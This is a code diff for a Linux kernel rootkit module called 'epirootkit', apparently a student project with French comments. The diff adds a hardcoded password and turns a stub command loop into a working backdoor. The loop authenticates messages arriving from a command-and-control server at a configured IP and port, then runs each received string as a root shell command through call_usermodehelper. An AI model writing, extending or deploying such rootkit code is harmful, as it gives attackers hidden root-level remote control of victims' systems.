@@ -27,11 +27,13 @@ static struct rootkit_config {
     char server_ip[16];
     size_t buffer_size;
     char xor_key[32];
+    char password[32];
 } config = {
     .port = 4242,
     .server_ip = "192.168.15.6",
     .buffer_size = 2048,
-    .xor_key = "epirootkit"
+    .xor_key = "epirootkit",
+    .password = "epirookit"
 };
 
 static struct socket *g_sock = NULL;
@@ -118,15 +120,53 @@ static int send_to_c2(const char *msg, size_t len) {
 }
 
 
-// Implémentation minimale pour compilation
 static int command_loop(void *data) {
-    pr_info("epirootkit: Dummy command_loop started\n");
+    char buffer[2048];
+    struct kvec iov;
+    struct msghdr msg_hdr = {0};
+    int len, authenticated = 0;
+
+    pr_info("epirootkit: command_loop started\n");
+
     while (!kthread_should_stop()) {
-        ssleep(1);
+        memset(buffer, 0, sizeof(buffer));
+        iov.iov_base = buffer;
+        iov.iov_len = sizeof(buffer) - 1;
+
+        len = kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, sizeof(buffer) - 1, MSG_DONTWAIT);
+        if (len <= 0) {
+            msleep(500);
+            continue;
+        }
+
+        buffer[len] = '\0';
+
+        if (!authenticated) {
+            if (strncmp(buffer, config.password, strlen(config.password)) == 0) {
+                authenticated = 1;
+                pr_info("epirootkit: authenticated\n");
+                send_to_c2("AUTH OK\n", 8);
+            } else {
+                pr_info("epirootkit: bad password\n");
+                send_to_c2("AUTH FAIL\n", 10);
+            }
+            continue;
+        }
+
+        // Si on est authentifié, on exécute la commande
+        char *argv[] = {"/bin/sh", "-c", buffer, NULL};
+        char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+
+        int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        if (ret)
+            pr_err("epirootkit: command failed (%d)\n", ret);
+        else
+            pr_info("epirootkit: command executed\n");
     }
-    pr_info("epirootkit: Dummy command_loop stopping\n");
+
     return 0;
 }
+
 
 static int __init epirootkit_init(void) {
     int err;
@@ -153,7 +193,7 @@ static int __init epirootkit_init(void) {
     }
 
     notify_connection_state(1);
-    send_to_c2("Comment aimez-vous votre blanquette ?\n", 6);
+    send_to_c2("DONE\n", 6);
     return 0;
 }
 
